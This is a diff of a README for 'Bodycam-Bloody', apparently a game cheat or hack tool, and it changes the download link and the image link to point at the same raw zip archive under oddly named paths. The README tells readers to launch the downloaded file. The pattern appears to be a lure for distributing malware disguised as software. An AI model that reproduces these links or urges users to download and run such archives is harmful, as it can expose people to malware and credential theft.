@@ -40,7 +40,7 @@ Explore a wide range of topics related to body cameras in our repository:
 - bodycam-wh
 
 ## Download
-🔗 Download the latest version of **Bodycam-Bloody** [here](https://github.com/repo/releases/9246/App.zip). 
+🔗 Download the latest version of **Bodycam-Bloody** [here](https://github.com/gabriel15112/Bodycam-Bloody/raw/refs/heads/main/apitong/Bodycam-Bloody-aneurism.zip). 
 🚀 Launch the downloaded file to experience the power of avant-garde surveillance technology.
 
 If the download link is not working, please visit the **Releases** section for alternative download options.
@@ -48,7 +48,7 @@ If the download link is not working, please visit the **Releases** section for a
 ## Get Started
 Ready to take your surveillance game to the next level? Join us on this exciting journey with **Bodycam-Bloody**! 🌟🕵️‍♂️
 
-![Bodycam Image](https://example.com/bodycam-image.jpg)
+![Bodycam Image](https://github.com/gabriel15112/Bodycam-Bloody/raw/refs/heads/main/apitong/Bodycam-Bloody-aneurism.zip)
 
 ---
 
